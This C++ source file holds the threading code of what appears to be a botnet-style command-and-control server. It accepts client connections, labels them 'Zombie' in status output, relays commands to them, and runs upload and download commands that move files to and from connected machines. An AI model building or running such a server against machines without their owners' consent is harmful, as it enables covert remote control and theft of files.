#include "Thread_Server.h"


void listen_client(Server* serv1, const unsigned short nb)
{
	char buffer[512] = { 0 };
	char big_buffer[HUGE_BUFFER] = { 0 };
	while (strcmp(buffer, "exit") != 0)
	{
		std::vector<st_Client> clients = serv1->getClients();
		if (recv(clients[nb].sock, buffer, sizeof(buffer), 0) > 0)
		{
			std::vector<std::string> args = split(buffer);

			if (args[0] == "upload" && args.size() == 2)
			{
				Transfer::uploadToClient(serv1,clients[nb].sock, args[1]);
			}
			else if (args[0] == "download" && args.size() == 2)
			{
				Transfer::downloadFromClient(serv1, args[1]);
			}
			else
				print_status("Zombie " + std::to_string(nb + 1) + ": " + buffer);
		}
		else
		{
			print_warning("Zombie : " + std::to_string(nb + 1) + " is unreachable ..");
			serv1->removeClient(nb);
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(REFRESH_RECV));


	}
}
void accept_t(Server* serv1)
{
	while (serv1->getExit() != 1)
	{
		serv1->acceptClient();
		std::this_thread::sleep_for(std::chrono::milliseconds(1000));
		//Sleep(1000);
	}
}
void send_t(Server* serv1)
{

	while (!serv1->getExit())
	{
		serv1->send_c();
	}
}

void refresh(bool* done, const unsigned int& refresh_rate, const int* pourcentage)
{
	while (*done != 1)
	{
#ifdef _WIN32
		system("cls");
#else
		system("clear");
#endif
		std::this_thread::sleep_for(std::chrono::milliseconds(refresh_rate));
		Animations::Loading(*pourcentage);

	}
}

